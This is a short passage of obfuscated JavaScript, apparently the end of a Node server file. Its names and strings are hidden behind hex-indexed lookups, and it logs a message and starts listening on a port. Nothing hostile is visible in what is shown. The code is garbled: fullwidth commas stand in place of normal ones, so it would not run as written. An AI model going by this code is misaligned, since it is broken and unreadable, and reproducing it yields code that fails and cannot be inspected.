_0x4e4f3c=_0x5c7431;console[_0x4e4f3c(0x147)](_0x4e4f3c(0x19b),_0x1a6ea8);})，app[_0x5c7431(0x143)](PORT，()=>console[_0x5c7431(0x11d)](_0x5c7431(0x139)+PORT+'!'));
